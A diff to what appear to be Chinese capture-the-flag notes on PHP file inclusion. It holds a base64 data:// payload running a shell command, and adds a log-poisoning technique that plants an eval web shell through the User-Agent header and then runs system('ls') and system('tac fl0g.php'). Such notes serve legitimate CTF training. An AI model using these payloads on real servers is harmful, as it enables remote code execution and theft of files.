@@ -53,8 +53,17 @@ payload：
 
 防止过滤一下：?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==
 但是结尾有.php的情况：include($c.".php"); 编码后会失效。
-
 ```
+
+^
+## **日志包含**
+考伪协议也可能考日志包含
+?file=/var/log/nginx/access.log
+修改UA为：<?php @eval($_REQUEST[1])?>
+1=system("ls");
+1=system("tac fl0g.php");
+
+
 
 
 ^
